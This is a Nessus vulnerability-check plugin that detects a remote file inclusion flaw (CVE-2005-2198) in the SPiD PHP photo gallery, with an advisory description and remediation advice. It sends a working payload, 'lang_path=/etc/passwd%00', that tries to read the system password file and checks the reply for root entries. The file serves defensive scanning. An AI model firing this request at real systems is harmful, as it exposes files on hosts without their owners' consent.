#
# (C) Tenable Network Security
#

include("compat.inc");

if (description) {
  script_id(18671);
  script_version("$Revision: 1.15 $");

  script_cve_id("CVE-2005-2198");
  script_bugtraq_id(14208);
  script_osvdb_id(17798);

  script_name(english:"SPiD lang.php lang_path Remote File Inclusion");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
remote file include issue." );
 script_set_attribute(attribute:"description", value:
"The remote host is running SPiD, a free, PHP-based photo gallery. 

The installed version of SPiD allows remote attackers to control the
'lang_path' variable used when including PHP code in the
'lang/lang.php' script.  By leveraging this flaw, an attacker may be
able to view arbitrary files on the remote host or to execute
arbitrary PHP code, possibly taken from third-party hosts." );
 script_set_attribute(attribute:"see_also", value:"http://securitytracker.com/alerts/2005/Jul/1014437.html" );
 script_set_attribute(attribute:"solution", value:
"Either ensure that PHP's 'magic_quotes_gpc' setting is enabled and
that 'allow_url_fopen' and 'register_globals' are disabled or upgrade
to SPiD version 1.3.1." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/07/11");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/07/09");
 script_cvs_date("$Date: 2011/03/14 21:48:13 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
  summary["english"] = "Checks for lang_path variable file include vulnerability in SPiD";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2011 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Try to exploit the flaw to read /etc/passwd.
  w = http_send_recv3(method:"GET",
    item:string(
      dir, "/lang/lang.php?",
      "lang_path=/etc/passwd%00"
    ), 
    port:port
  );
  if (isnull(w)) exit(1, "The web server on port "+port+" did not answer");
  res = w[2];

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(string:res, pattern:"root:.*:0:[01]:") ||
    # we get an error saying "failed to open stream" or "failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but passing 
    #     remote URLs might still work.
    egrep(string:res, pattern:"Warning: main\(/etc/passwd.+failed to open stream") ||
    egrep(string:res, pattern:"Warning: Failed opening '/etc/passwd.+for inclusion")
  ) {
    security_warning(port);
    exit(0);
  }
}
